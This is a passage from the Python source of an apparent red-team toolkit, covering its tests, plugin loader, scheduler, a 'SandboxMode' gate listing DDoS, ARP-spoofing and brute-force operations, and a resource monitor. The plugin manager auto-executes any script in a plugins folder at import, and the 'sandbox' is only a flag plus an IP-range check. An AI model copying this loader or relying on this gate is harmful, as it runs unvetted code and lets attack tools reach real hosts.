            timeout = safe_defaults.get_safe_default('network_scan', 'timeout', 60)
            self.assertEqual(timeout, 5)  # Should use safe default


    class TestRateLimiting(unittest.TestCase):
        """Tests for rate limiting functionality."""
        
        def test_rate_limiter_creation(self):
            """Test rate limiter creation."""
            limiter = RateLimiter(max_requests=10, time_window=1)
            self.assertEqual(limiter.max_requests, 10)
            self.assertEqual(limiter.time_window, 1)
        
        def test_rate_limiting_behavior(self):
            """Test rate limiting behavior."""
            limiter = RateLimiter(max_requests=3, time_window=1)
            
            # First 3 requests should succeed
            for i in range(3):
                self.assertTrue(limiter.can_proceed())
            
            # 4th request should fail
            self.assertFalse(limiter.can_proceed())
        
        def test_rate_limiter_reset(self):
            """Test rate limiter reset functionality."""
            limiter = RateLimiter(max_requests=1, time_window=0.1)
            
            # First request should succeed
            self.assertTrue(limiter.can_proceed())
            
            # Second request should fail
            self.assertFalse(limiter.can_proceed())
            
            # Wait for reset
            time.sleep(0.2)
            
            # Should succeed again
            self.assertTrue(limiter.can_proceed())


    # Integration Test Classes
    class TestPortScannerIntegration(unittest.TestCase):
        """Integration tests for port scanner functionality."""
        
        def setUp(self):
            self.test_host = "127.0.0.1"
        
        @unittest.mock.patch('socket.socket')
        def test_port_scan_integration(self, mock_socket):
            """Test port scanner integration with mocked socket."""
            # Mock socket behavior
            mock_socket_instance = unittest.mock.MagicMock()
            mock_socket.return_value = mock_socket_instance
            
            # Mock successful connection
            mock_socket_instance.connect.return_value = None
            
            # Test port scanning (this would need to be adapted to the actual port_scanner function)
            # For now, we'll test the validation functions
            qa = QualityAssurance()
            self.assertTrue(qa._validate_ip_address(self.test_host))
            self.assertTrue(qa._validate_port(80))


    class TestWebToolsIntegration(unittest.TestCase):
        """Integration tests for web tools functionality."""
        
        @unittest.mock.patch('requests.get')
        def test_web_scraping_integration(self, mock_get):
            """Test web scraping integration with mocked requests."""
            # Mock successful response
            mock_response = unittest.mock.MagicMock()
            mock_response.text = "<html><body>Test content</body></html>"
            mock_response.status_code = 200
            mock_get.return_value = mock_response
            
            # Test URL validation
            qa = QualityAssurance()
            self.assertTrue(qa._validate_url("http://example.com"))


    class TestFileAnalysisIntegration(unittest.TestCase):
        """Integration tests for file analysis functionality."""
        
        def setUp(self):
            self.test_file = Path(tempfile.mktemp())
            self.test_file.write_text("Test file content for analysis")
        
        def tearDown(self):
            if self.test_file.exists():
                self.test_file.unlink()
        
        def test_file_analysis_integration(self):
            """Test file analysis integration."""
            # Test file existence validation
            qa = QualityAssurance()
            self.assertTrue(qa._validate_file_path(str(self.test_file)))
            
            # Test file size validation
            safe_defaults = SafeDefaults()
            file_size = self.test_file.stat().st_size
            max_size = safe_defaults.get_safe_default('file_operations', 'max_file_size')
            self.assertLess(file_size, max_size)


    class TestReportingIntegration(unittest.TestCase):
        """Integration tests for reporting functionality."""
        
        def setUp(self):
            self.report_manager = ReportManager()
        
        def test_report_generation_integration(self):
            """Test report generation integration."""
            # Start a test report
            report_id = self.report_manager.start_tool_report("Test Tool", "test_target")
            self.assertIsNotNone(report_id)
            
            # Add findings
            self.report_manager.add_finding(report_id, "Test Finding", "Test description", "INFO")
            
            # Save report
            report_file = self.report_manager.save_tool_report(report_id, "txt")
            self.assertIsNotNone(report_file)
            
            # Verify file exists
            self.assertTrue(Path(report_file).exists())


# Phase 8: Extensibility & Advanced Features

class PluginManager:
    """Plugin system for loading external Python scripts as modules."""
    
    def __init__(self):
        self.plugins_dir = Path("plugins")
        self.plugins_dir.mkdir(exist_ok=True)
        self.loaded_plugins = {}
        self.plugin_metadata = {}
        self.sandbox_mode = True  # Default to safe mode
        self.auto_discovery = True
        self.plugin_registry = {}
        self.resource_monitor = ResourceMonitor()
    
    def discover_plugins(self) -> List[str]:
        """Auto-detect new tools in /plugins directory."""
        discovered_plugins = []
        
        if not self.plugins_dir.exists():
            logger.info(f"Creating plugins directory: {self.plugins_dir}")
            self.plugins_dir.mkdir(exist_ok=True)
            return discovered_plugins
        
        for plugin_file in self.plugins_dir.glob("*.py"):
            if plugin_file.name.startswith("_"):
                continue  # Skip private modules
            
            plugin_name = plugin_file.stem
            discovered_plugins.append(plugin_name)
            
            if plugin_name not in self.loaded_plugins:
                logger.info(f"Discovered plugin: {plugin_name}")
        
        return discovered_plugins
    
    def load_plugin(self, plugin_name: str) -> bool:
        """Load a plugin from the plugins directory."""
        plugin_path = self.plugins_dir / f"{plugin_name}.py"
        
        if not plugin_path.exists():
            logger.error(f"Plugin file not found: {plugin_path}")
            return False
        
        try:
            # Load plugin module
            spec = importlib.util.spec_from_file_location(plugin_name, plugin_path)
            if spec is None or spec.loader is None:
                logger.error(f"Could not create spec for plugin: {plugin_name}")
                return False
            
            plugin_module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(plugin_module)
            
            # Extract plugin metadata
            metadata = self._extract_plugin_metadata(plugin_module, plugin_name)
            self.plugin_metadata[plugin_name] = metadata
            
            # Store loaded plugin
            self.loaded_plugins[plugin_name] = plugin_module
            
            # Auto-register plugin functions as tools
            self._auto_register_plugin_tools(plugin_name, metadata)
            
            logger.info(f"Successfully loaded plugin: {plugin_name}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to load plugin {plugin_name}: {e}")
            return False
    
    def _extract_plugin_metadata(self, plugin_module, plugin_name: str) -> dict:
        """Extract metadata from plugin module."""
        metadata = {
            'name': plugin_name,
            'version': getattr(plugin_module, '__version__', '1.0.0'),
            'description': getattr(plugin_module, '__description__', 'No description available'),
            'author': getattr(plugin_module, '__author__', 'Unknown'),
            'requires_sandbox': getattr(plugin_module, '__requires_sandbox__', True),
            'category': getattr(plugin_module, '__category__', 'General'),
            'functions': []
        }
        
        # Extract available functions
        for attr_name in dir(plugin_module):
            attr = getattr(plugin_module, attr_name)
            if callable(attr) and not attr_name.startswith('_'):
                metadata['functions'].append(attr_name)
        
        return metadata
    
    def get_plugin_info(self, plugin_name: str) -> Optional[dict]:
        """Get information about a loaded plugin."""
        if plugin_name in self.plugin_metadata:
            return self.plugin_metadata[plugin_name]
        return None
    
    def list_plugins(self) -> List[dict]:
        """List all available plugins with their metadata."""
        return list(self.plugin_metadata.values())
    
    def execute_plugin_function(self, plugin_name: str, function_name: str, *args, **kwargs) -> Any:
        """Execute a function from a loaded plugin."""
        if plugin_name not in self.loaded_plugins:
            logger.error(f"Plugin not loaded: {plugin_name}")
            return None
        
        plugin_module = self.loaded_plugins[plugin_name]
        
        if not hasattr(plugin_module, function_name):
            logger.error(f"Function {function_name} not found in plugin {plugin_name}")
            return None
        
        # Check sandbox requirements
        metadata = self.plugin_metadata.get(plugin_name, {})
        if metadata.get('requires_sandbox', True) and not self.sandbox_mode:
            logger.warning(f"Plugin {plugin_name} requires sandbox mode but it's disabled")
            return None
        
        # Start resource monitoring
        self.resource_monitor.start_monitoring(f"plugin_{plugin_name}_{function_name}")
        
        try:
            function = getattr(plugin_module, function_name)
            result = function(*args, **kwargs)
            
            # Log successful execution
            logger.info(f"Successfully executed {function_name} from plugin {plugin_name}")
            return result
            
        except Exception as e:
            logger.error(f"Error executing {function_name} from plugin {plugin_name}: {e}")
            return None
    
    def auto_discover_and_load(self) -> List[str]:
        """Automatically discover and load all available plugins."""
        discovered_plugins = self.discover_plugins()
        loaded_plugins = []
        
        for plugin_name in discovered_plugins:
            if plugin_name not in self.loaded_plugins:
                if self.load_plugin(plugin_name):
                    loaded_plugins.append(plugin_name)
                    logger.info(f"Auto-loaded plugin: {plugin_name}")
        
        return loaded_plugins
    
    def register_plugin_tool(self, plugin_name: str, function_name: str, tool_info: Dict[str, Any]):
        """Register a plugin function as a toolkit tool."""
        tool_id = f"plugin_{plugin_name}_{function_name}"
        
        self.plugin_registry[tool_id] = {
            'plugin_name': plugin_name,
            'function_name': function_name,
            'tool_info': tool_info,
            'registered_at': datetime.datetime.now().isoformat()
        }
        
        logger.info(f"Registered plugin tool: {tool_id}")
    
    def get_registered_tools(self) -> List[Dict[str, Any]]:
        """Get list of all registered plugin tools."""
        tools = []
        
        for tool_id, tool_data in self.plugin_registry.items():
            if tool_data['plugin_name'] in self.loaded_plugins:
                tools.append({
                    'tool_id': tool_id,
                    'name': tool_data['tool_info'].get('name', tool_id),
                    'description': tool_data['tool_info'].get('description', 'Plugin tool'),
                    'category': tool_data['tool_info'].get('category', 'Plugin'),
                    'plugin_name': tool_data['plugin_name'],
                    'function_name': tool_data['function_name']
                })
        
        return tools
    
    def execute_registered_tool(self, tool_id: str, *args, **kwargs) -> Any:
        """Execute a registered plugin tool."""
        if tool_id not in self.plugin_registry:
            logger.error(f"Tool not registered: {tool_id}")
            return None
        
        tool_data = self.plugin_registry[tool_id]
        return self.execute_plugin_function(
            tool_data['plugin_name'], 
            tool_data['function_name'], 
            *args, 
            **kwargs
        )
    
    def _auto_register_plugin_tools(self, plugin_name: str, metadata: Dict[str, Any]):
        """Automatically register plugin functions as tools."""
        functions = metadata.get('functions', [])
        
        for function_name in functions:
            if function_name not in ['plugin_info', '__init__', '__version__', '__description__', '__author__', '__category__']:
                tool_info = {
                    'name': f"{plugin_name}_{function_name}",
                    'description': f"Plugin function: {function_name} from {plugin_name}",
                    'category': metadata.get('category', 'Plugin'),
                    'plugin_name': plugin_name,
                    'function_name': function_name
                }
                
                self.register_plugin_tool(plugin_name, function_name, tool_info)
                logger.info(f"Auto-registered tool: {plugin_name}_{function_name}")
    
    def get_all_available_tools(self) -> List[Dict[str, Any]]:
        """Get all available tools including built-in and plugin tools."""
        # Get built-in tools (you can expand this list)
        built_in_tools = [
            {'tool_id': 'port_scanner', 'name': 'Port Scanner', 'description': 'Multi-threaded port discovery', 'category': 'Network'},
            {'tool_id': 'hash_generator', 'name': 'Hash Generator', 'description': 'Generate various hash types', 'category': 'Cryptography'},
            {'tool_id': 'dns_tools', 'name': 'DNS Tools', 'description': 'DNS lookup and enumeration', 'category': 'Network'},
            {'tool_id': 'web_scraper', 'name': 'Web Scraper', 'description': 'Web reconnaissance and scraping', 'category': 'Web'},
            {'tool_id': 'file_analyzer', 'name': 'File Analyzer', 'description': 'Binary file analysis', 'category': 'Forensics'}
        ]
        
        # Get plugin tools
        plugin_tools = self.get_registered_tools()
        
        # Combine and return
        all_tools = built_in_tools + plugin_tools
        return all_tools
    
    def unload_plugin(self, plugin_name: str) -> bool:
        """Unload a plugin."""
        if plugin_name in self.loaded_plugins:
            del self.loaded_plugins[plugin_name]
            if plugin_name in self.plugin_metadata:
                del self.plugin_metadata[plugin_name]
            logger.info(f"Unloaded plugin: {plugin_name}")
            return True
        return False


class TaskScheduler:
    """Scheduler for running scans at intervals or on-demand."""
    
    def __init__(self):
        self.scheduled_tasks = {}
        self.running_tasks = {}
        self.task_history = []
        self.scheduler_thread = None
        self.is_running = False
    
    def schedule_task(self, task_name: str, task_function: Callable, 
                     interval: Union[str, int], *args, **kwargs) -> bool:
        """Schedule a task to run at specified intervals."""
        try:
            if isinstance(interval, str):
                # Parse interval string (e.g., "5 minutes", "1 hour", "daily")
                schedule.every().interval(interval).do(
                    self._execute_task, task_name, task_function, *args, **kwargs
                )
            else:
                # Interval in seconds
                schedule.every(interval).seconds.do(
                    self._execute_task, task_name, task_function, *args, **kwargs
                )
            
            self.scheduled_tasks[task_name] = {
                'function': task_function,
                'interval': interval,
                'args': args,
                'kwargs': kwargs,
                'created': datetime.datetime.now(),
                'last_run': None,
                'next_run': None,
                'runs_count': 0
            }
            
            logger.info(f"Scheduled task: {task_name} with interval: {interval}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to schedule task {task_name}: {e}")
            return False
    
    def _execute_task(self, task_name: str, task_function: Callable, *args, **kwargs):
        """Execute a scheduled task."""
        if task_name not in self.scheduled_tasks:
            return
        
        task_info = self.scheduled_tasks[task_name]
        start_time = datetime.datetime.now()
        
        try:
            logger.info(f"Executing scheduled task: {task_name}")
            
            # Execute the task
            result = task_function(*args, **kwargs)
            
            # Update task info
            task_info['last_run'] = start_time
            task_info['runs_count'] += 1
            
            # Record in history
            self.task_history.append({
                'task_name': task_name,
                'start_time': start_time,
                'end_time': datetime.datetime.now(),
                'success': True,
                'result': result
            })
            
            logger.info(f"Successfully executed scheduled task: {task_name}")
            
        except Exception as e:
            logger.error(f"Error executing scheduled task {task_name}: {e}")
            
            # Record failure in history
            self.task_history.append({
                'task_name': task_name,
                'start_time': start_time,
                'end_time': datetime.datetime.now(),
                'success': False,
                'error': str(e)
            })
    
    def run_once(self, task_name: str, task_function: Callable, *args, **kwargs) -> bool:
        """Run a task once immediately."""
        try:
            logger.info(f"Running task once: {task_name}")
            result = task_function(*args, **kwargs)
            
            # Record in history
            self.task_history.append({
                'task_name': task_name,
                'start_time': datetime.datetime.now(),
                'end_time': datetime.datetime.now(),
                'success': True,
                'result': result
            })
            
            return True
            
        except Exception as e:
            logger.error(f"Error running task {task_name}: {e}")
            
            # Record failure in history
            self.task_history.append({
                'task_name': task_name,
                'start_time': datetime.datetime.now(),
                'end_time': datetime.datetime.now(),
                'success': False,
                'error': str(e)
            })
            
            return False
    
    def start_scheduler(self):
        """Start the scheduler thread."""
        if self.is_running:
            logger.warning("Scheduler is already running")
            return
        
        self.is_running = True
        self.scheduler_thread = threading.Thread(target=self._scheduler_loop, daemon=True)
        self.scheduler_thread.start()
        logger.info("Task scheduler started")
    
    def stop_scheduler(self):
        """Stop the scheduler thread."""
        self.is_running = False
        if self.scheduler_thread:
            self.scheduler_thread.join(timeout=5)
        logger.info("Task scheduler stopped")
    
    def _scheduler_loop(self):
        """Main scheduler loop."""
        while self.is_running:
            try:
                schedule.run_pending()
                time.sleep(1)
            except Exception as e:
                logger.error(f"Error in scheduler loop: {e}")
                time.sleep(5)
    
    def list_scheduled_tasks(self) -> List[dict]:
        """List all scheduled tasks."""
        return list(self.scheduled_tasks.values())
    
    def list_task_history(self, limit: int = 50) -> List[dict]:
        """List recent task execution history."""
        return self.task_history[-limit:]
    
    def cancel_task(self, task_name: str) -> bool:
        """Cancel a scheduled task."""
        if task_name in self.scheduled_tasks:
            schedule.clear(task_name)
            del self.scheduled_tasks[task_name]
            logger.info(f"Cancelled scheduled task: {task_name}")
            return True
        return False


class SandboxMode:
    """Sandbox mode for restricting destructive tools to lab testing."""
    
    def __init__(self):
        self.sandbox_enabled = True
        self.lab_networks = [
            "192.168.1.0/24",
            "192.168.0.0/24", 
            "10.0.0.0/8",
            "172.16.0.0/12"
        ]
        self.destructive_operations = {
            'ddos_simulator': True,
            'arp_spoofing': True,
            'brute_force': True,
            'file_deletion': True,
            'network_scanning': False,  # Allow basic scanning
            'web_testing': False,       # Allow basic web testing
            'plugin_execution': True,
            'port_scanning': False,     # Allow basic port scanning
            'dns_enumeration': False,   # Allow basic DNS operations
            'web_scraping': False       # Allow basic web scraping
        }
        self.safety_checks = {
            'max_scan_targets': 10,
            'max_brute_force_attempts': 100,
            'max_file_size': 10 * 1024 * 1024,  # 10MB
            'max_network_operations': 50,
            'max_concurrent_threads': 20,
            'max_plugin_executions': 10,
            'max_scheduled_tasks': 5
        }
        self.dangerous_tools = {
            'ddos_simulator': 'Load testing tool - use only in lab environments',
            'arp_spoofing': 'MITM attack simulation - use only in lab environments',
            'brute_force': 'Password cracking - use only with authorization',
            'file_deletion': 'File system modification - use with extreme caution'
        }
    
    def is_sandbox_enabled(self) -> bool:
        """Check if sandbox mode is enabled."""
        return self.sandbox_enabled
    
    def enable_sandbox(self):
        """Enable sandbox mode."""
        self.sandbox_enabled = True
        logger.info("Sandbox mode enabled")
    
    def disable_sandbox(self):
        """Disable sandbox mode."""
        self.sandbox_enabled = False
        logger.warning("Sandbox mode disabled - destructive operations allowed")
    
    def is_lab_network(self, target: str) -> bool:
        """Check if target is in lab network range."""
        try:
            target_ip = ipaddress.ip_address(target)
            for network in self.lab_networks:
                if target_ip in ipaddress.ip_network(network):
                    return True
            return False
        except ValueError:
            return False
    
    def check_operation_safety(self, operation: str, target: str = None, **kwargs) -> bool:
        """Check if an operation is safe to perform."""
        if not self.sandbox_enabled:
            return True  # Sandbox disabled, allow all operations
        
        # Check if operation is destructive
        if operation in self.destructive_operations:
            if self.destructive_operations[operation]:
                # Destructive operation requires lab network
                if target and not self.is_lab_network(target):
                    logger.warning(f"Destructive operation '{operation}' blocked: {target} not in lab network")
                    return False
        
        # Check safety limits
        if 'max_scan_targets' in kwargs:
            if kwargs['max_scan_targets'] > self.safety_checks['max_scan_targets']:
                logger.warning(f"Scan targets limit exceeded: {kwargs['max_scan_targets']} > {self.safety_checks['max_scan_targets']}")
                return False
        
        if 'max_brute_force_attempts' in kwargs:
            if kwargs['max_brute_force_attempts'] > self.safety_checks['max_brute_force_attempts']:
                logger.warning(f"Brute force attempts limit exceeded: {kwargs['max_brute_force_attempts']} > {self.safety_checks['max_brute_force_attempts']}")
                return False
        
        return True
    
    def get_safety_info(self) -> dict:
        """Get current safety configuration."""
        return {
            'sandbox_enabled': self.sandbox_enabled,
            'lab_networks': self.lab_networks,
            'destructive_operations': self.destructive_operations,
            'safety_checks': self.safety_checks
        }
    
    def add_lab_network(self, network: str):
        """Add a network to the lab networks list."""
        try:
            ipaddress.ip_network(network)  # Validate network format
            if network not in self.lab_networks:
                self.lab_networks.append(network)
                logger.info(f"Added lab network: {network}")
        except ValueError:
            logger.error(f"Invalid network format: {network}")
    
    def remove_lab_network(self, network: str):
        """Remove a network from the lab networks list."""
        if network in self.lab_networks:
            self.lab_networks.remove(network)
            logger.info(f"Removed lab network: {network}")


class ResourceMonitor:
    """Monitor system resources during toolkit operations."""
    
    def __init__(self):
        self.monitoring_enabled = True
        self.resource_history = []
        self.max_history_size = 100
    
    def get_system_resources(self) -> Dict[str, float]:
        """Get current system resource usage."""
        try:
            if not EXTENSIBILITY_AVAILABLE:
                return {'cpu_percent': 0.0, 'memory_percent': 0.0, 'disk_usage': 0.0}
            
            cpu_percent = psutil.cpu_percent(interval=0.1)
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            
            return {
                'cpu_percent': cpu_percent,
                'memory_percent': memory.percent,
                'memory_used_gb': memory.used / (1024**3),
                'memory_total_gb': memory.total / (1024**3),
                'disk_usage': disk.percent,
                'disk_free_gb': disk.free / (1024**3)
            }
        except Exception as e:
            logger.error(f"Error getting system resources: {e}")
            return {'cpu_percent': 0.0, 'memory_percent': 0.0, 'disk_usage': 0.0}
    
    def start_monitoring(self, operation_name: str):
        """Start monitoring for a specific operation."""
        if not self.monitoring_enabled:
            return
        
        resources = self.get_system_resources()
        resources['operation'] = operation_name
        resources['timestamp'] = datetime.datetime.now().isoformat()
        
        self.resource_history.append(resources)
        
        # Keep history size manageable
        if len(self.resource_history) > self.max_history_size:
            self.resource_history.pop(0)
        
        # Log high resource usage
        if resources['cpu_percent'] > 80:
            logger.warning(f"High CPU usage during {operation_name}: {resources['cpu_percent']}%")
        if resources['memory_percent'] > 85:
            logger.warning(f"High memory usage during {operation_name}: {resources['memory_percent']}%")
    
    def get_resource_summary(self) -> Dict[str, Any]:
        """Get resource usage summary."""
        if not self.resource_history:
            return {'message': 'No resource data available'}
        
        recent_resources = self.resource_history[-10:]  # Last 10 entries
        
        cpu_values = [r['cpu_percent'] for r in recent_resources]
        memory_values = [r['memory_percent'] for r in recent_resources]
        
        return {
            'current_cpu': cpu_values[-1] if cpu_values else 0,
            'current_memory': memory_values[-1] if memory_values else 0,
            'avg_cpu': sum(cpu_values) / len(cpu_values) if cpu_values else 0,
            'avg_memory': sum(memory_values) / len(memory_values) if memory_values else 0,
            'max_cpu': max(cpu_values) if cpu_values else 0,
            'max_memory': max(memory_values) if memory_values else 0,
            'total_operations': len(self.resource_history)
        }
    
    def display_resource_status(self):
        """Display current resource status in CLI."""
        if not self.monitoring_enabled:
            return
        
        resources = self.get_system_resources()
        summary = self.get_resource_summary()
        
        if cli_manager.enable_rich and RICH_AVAILABLE:
            # Create resource status table
            table = Table(title="System Resource Status")
            table.add_column("Resource", style="cyan")
            table.add_column("Current", style="green")
            table.add_column("Average", style="blue")
            table.add_column("Max", style="yellow")
            
            table.add_row(
                "CPU Usage",
                f"{resources['cpu_percent']:.1f}%",
                f"{summary['avg_cpu']:.1f}%",
                f"{summary['max_cpu']:.1f}%"
            )
            table.add_row(
                "Memory Usage",
                f"{resources['memory_percent']:.1f}%",
                f"{summary['avg_memory']:.1f}%",
                f"{summary['max_memory']:.1f}%"
            )
            table.add_row(
                "Memory Used",
                f"{resources['memory_used_gb']:.1f}GB",
                "-",
                "-"
            )
            table.add_row(
                "Disk Usage",
                f"{resources['disk_usage']:.1f}%",
                "-",
                "-"
            )
            
            cli_manager.console.print(table)
        else:
            print(f"CPU: {resources['cpu_percent']:.1f}% | Memory: {resources['memory_percent']:.1f}% | Disk: {resources['disk_usage']:.1f}%")


# Initialize Phase 8 systems
plugin_manager = PluginManager()
task_scheduler = TaskScheduler()
sandbox_mode = SandboxMode()

# Start scheduler
if EXTENSIBILITY_AVAILABLE:
    task_scheduler.start_scheduler()
    
    # Auto-discover and load plugins
    auto_loaded_plugins = plugin_manager.auto_discover_and_load()
    if auto_loaded_plugins:
        logger.info(f"Auto-loaded {len(auto_loaded_plugins)} plugins: {', '.join(auto_loaded_plugins)}")


def plugin_management_menu():
    """Plugin management menu for loading and managing external plugins."""
    while True:
        cli_manager.print_panel("🔌 Plugin Management System", "blue")
        
        # Discover and load plugins
        discovered_plugins = plugin_manager.discover_plugins()
        loaded_plugins = plugin_manager.list_plugins()
        
        options = [
            (1, "List Available Plugins", f"Found {len(discovered_plugins)} plugins"),
            (2, "Load Plugin", "Load a specific plugin"),
            (3, "List Loaded Plugins", f"Currently loaded: {len(loaded_plugins)}"),
            (4, "Execute Plugin Function", "Run a function from a loaded plugin"),
            (5, "Plugin Information", "View detailed plugin metadata"),
            (6, "Unload Plugin", "Remove a plugin from memory"),
            (7, "Create Plugin Template", "Generate a new plugin template"),
            (0, "Back to Main Menu", "Return to main menu")
        ]
        
        cli_manager.print_menu(options)
        choice = cli_manager.get_choice("Select an option")
        
        if not choice:
            continue
        
        if choice == "0":
            break
        elif choice == "1":
            _list_available_plugins(discovered_plugins)
        elif choice == "2":
            _load_plugin_menu(discovered_plugins)
        elif choice == "3":
            _list_loaded_plugins(loaded_plugins)
        elif choice == "4":
            _execute_plugin_function_menu(loaded_plugins)
        elif choice == "5":
            _plugin_information_menu(loaded_plugins)
        elif choice == "6":
            _unload_plugin_menu(loaded_plugins)
        elif choice == "7":
            _create_plugin_template()


def _list_available_plugins(discovered_plugins):
    """List all available plugins in the plugins directory."""
    if not discovered_plugins:
        cli_manager.print_panel("No plugins found in plugins directory", "yellow")
        return
    
    table = Table(title="Available Plugins")
    table.add_column("Plugin Name", style="cyan")
    table.add_column("Status", style="green")
    table.add_column("File Path", style="blue")
    
    for plugin_name in discovered_plugins:
        plugin_path = plugin_manager.plugins_dir / f"{plugin_name}.py"
        status = "Loaded" if plugin_name in plugin_manager.loaded_plugins else "Available"
        table.add_row(plugin_name, status, str(plugin_path))
    
    cli_manager.console.print(table)


def _load_plugin_menu(discovered_plugins):
    """Menu for loading a specific plugin."""
    if not discovered_plugins:
        cli_manager.print_panel("No plugins available to load", "yellow")
        return
    
    cli_manager.print_panel("Select a plugin to load:", "blue")
    
    for i, plugin_name in enumerate(discovered_plugins, 1):
        status = "✓ Loaded" if plugin_name in plugin_manager.loaded_plugins else "○ Available"
        cli_manager.console.print(f"{i}. {plugin_name} - {status}")
    
    choice = cli_manager.get_choice("Enter plugin number")
    if not choice or not choice.isdigit():
        return
    
    try:
        plugin_index = int(choice) - 1
        if 0 <= plugin_index < len(discovered_plugins):
            plugin_name = discovered_plugins[plugin_index]
            if plugin_manager.load_plugin(plugin_name):
                cli_manager.print_panel(f"✅ Successfully loaded plugin: {plugin_name}", "green")
            else:
                cli_manager.print_panel(f"❌ Failed to load plugin: {plugin_name}", "red")
        else:
            cli_manager.print_panel("Invalid plugin number", "red")
    except ValueError:
        cli_manager.print_panel("Invalid input", "red")


def _list_loaded_plugins(loaded_plugins):
    """List all currently loaded plugins."""
    if not loaded_plugins:
        cli_manager.print_panel("No plugins currently loaded", "yellow")
        return
    
    table = Table(title="Loaded Plugins")
    table.add_column("Name", style="cyan")
    table.add_column("Version", style="green")
    table.add_column("Author", style="blue")
    table.add_column("Category", style="yellow")
    table.add_column("Functions", style="magenta")
    
    for plugin in loaded_plugins:
        functions_count = len(plugin.get('functions', []))
        table.add_row(
            plugin['name'],
            plugin.get('version', 'N/A'),
            plugin.get('author', 'Unknown'),
            plugin.get('category', 'General'),
            str(functions_count)
        )
    
    cli_manager.console.print(table)


def _execute_plugin_function_menu(loaded_plugins):
    """Menu for executing plugin functions."""
    if not loaded_plugins:
        cli_manager.print_panel("No plugins loaded", "yellow")
        return
    
    # Select plugin
    cli_manager.print_panel("Select a plugin:", "blue")
    for i, plugin in enumerate(loaded_plugins, 1):
        cli_manager.console.print(f"{i}. {plugin['name']} - {plugin.get('description', 'No description')}")
    
    choice = cli_manager.get_choice("Enter plugin number")
    if not choice or not choice.isdigit():
        return
    
    try:
        plugin_index = int(choice) - 1
        if 0 <= plugin_index < len(loaded_plugins):
            plugin = loaded_plugins[plugin_index]
            _execute_plugin_function(plugin)
        else:
            cli_manager.print_panel("Invalid plugin number", "red")
    except ValueError:
        cli_manager.print_panel("Invalid input", "red")


def _execute_plugin_function(plugin):
    """Execute a function from a specific plugin."""
    functions = plugin.get('functions', [])
    if not functions:
        cli_manager.print_panel(f"No functions available in plugin {plugin['name']}", "yellow")
        return
    
    cli_manager.print_panel(f"Available functions in {plugin['name']}:", "blue")
    for i, func_name in enumerate(functions, 1):
        cli_manager.console.print(f"{i}. {func_name}")
    
    choice = cli_manager.get_choice("Enter function number")
    if not choice or not choice.isdigit():
        return
    
    try:
        func_index = int(choice) - 1
        if 0 <= func_index < len(functions):
            func_name = functions[func_index]
            
            # Get function arguments
            args_input = cli_manager.get_input("Enter function arguments (comma-separated)")
            args = [arg.strip() for arg in args_input.split(',')] if args_input else []
            
            # Execute function
            result = plugin_manager.execute_plugin_function(plugin['name'], func_name, *args)
            
            if result is not None:
                cli_manager.print_panel(f"Function executed successfully", "green")
                cli_manager.console.print(f"Result: {result}")
            else:
                cli_manager.print_panel("Function execution failed", "red")
        else:
            cli_manager.print_panel("Invalid function number", "red")
    except ValueError:
        cli_manager.print_panel("Invalid input", "red")


def _plugin_information_menu(loaded_plugins):
    """Display detailed information about a plugin."""
    if not loaded_plugins:
        cli_manager.print_panel("No plugins loaded", "yellow")
        return
    
    # Select plugin
    cli_manager.print_panel("Select a plugin for detailed information:", "blue")
    for i, plugin in enumerate(loaded_plugins, 1):
        cli_manager.console.print(f"{i}. {plugin['name']}")
    
    choice = cli_manager.get_choice("Enter plugin number")
    if not choice or not choice.isdigit():
        return
    
    try:
        plugin_index = int(choice) - 1
        if 0 <= plugin_index < len(loaded_plugins):
            plugin = loaded_plugins[plugin_index]
            _display_plugin_info(plugin)
        else:
            cli_manager.print_panel("Invalid plugin number", "red")
    except ValueError:
        cli_manager.print_panel("Invalid input", "red")


def _display_plugin_info(plugin):
    """Display detailed information about a plugin."""
    cli_manager.print_panel(f"Plugin Information: {plugin['name']}", "blue")
    
    info_table = Table()
    info_table.add_column("Property", style="cyan")
    info_table.add_column("Value", style="green")
    
    info_table.add_row("Name", plugin['name'])
    info_table.add_row("Version", plugin.get('version', 'N/A'))
    info_table.add_row("Author", plugin.get('author', 'Unknown'))
    info_table.add_row("Category", plugin.get('category', 'General'))
    info_table.add_row("Description", plugin.get('description', 'No description'))
    info_table.add_row("Requires Sandbox", str(plugin.get('requires_sandbox', True)))
    info_table.add_row("Functions", str(len(plugin.get('functions', []))))
    
    cli_manager.console.print(info_table)
    
    # List functions
    functions = plugin.get('functions', [])
    if functions:
        cli_manager.print_panel("Available Functions:", "blue")
        for func_name in functions:
            cli_manager.console.print(f"• {func_name}")


def _unload_plugin_menu(loaded_plugins):
    """Menu for unloading plugins."""
    if not loaded_plugins:
        cli_manager.print_panel("No plugins loaded", "yellow")
        return
    
    # Select plugin
    cli_manager.print_panel("Select a plugin to unload:", "blue")
    for i, plugin in enumerate(loaded_plugins, 1):
        cli_manager.console.print(f"{i}. {plugin['name']}")
    
    choice = cli_manager.get_choice("Enter plugin number")
    if not choice or not choice.isdigit():
        return
    
    try:
        plugin_index = int(choice) - 1
        if 0 <= plugin_index < len(loaded_plugins):
            plugin = loaded_plugins[plugin_index]
            if cli_manager.confirm_action(f"Are you sure you want to unload {plugin['name']}?"):
                if plugin_manager.unload_plugin(plugin['name']):
                    cli_manager.print_panel(f"✅ Successfully unloaded plugin: {plugin['name']}", "green")
                else:
                    cli_manager.print_panel(f"❌ Failed to unload plugin: {plugin['name']}", "red")
        else:
            cli_manager.print_panel("Invalid plugin number", "red")
    except ValueError:
        cli_manager.print_panel("Invalid input", "red")


def _create_plugin_template():
    """Create a new plugin template."""
    plugin_name = cli_manager.get_input("Enter plugin name")
    if not plugin_name:
        return
    
    plugin_path = plugin_manager.plugins_dir / f"{plugin_name}.py"
    
    if plugin_path.exists():
        cli_manager.print_panel(f"Plugin {plugin_name} already exists", "red")
        return
    
    template_content = f'''#!/usr/bin/env python3
"""
{plugin_name} Plugin for Enhanced Red Team Toolkit
"""

__version__ = "1.0.0"
__description__ = "Description of {plugin_name} plugin"
__author__ = "Your Name"
__requires_sandbox__ = True
__category__ = "General"

import logging

logger = logging.getLogger(__name__)

def example_function():
    """Example function for the plugin."""
    logger.info("Example function called from {plugin_name} plugin")
    return "Hello from {plugin_name} plugin!"

def another_function(param1, param2):
    """Another example function with parameters."""
    logger.info(f"Another function called with params: {{param1}}, {{param2}}")
    return f"Processed: {{param1}} and {{param2}}"

# Add more functions as needed
'''
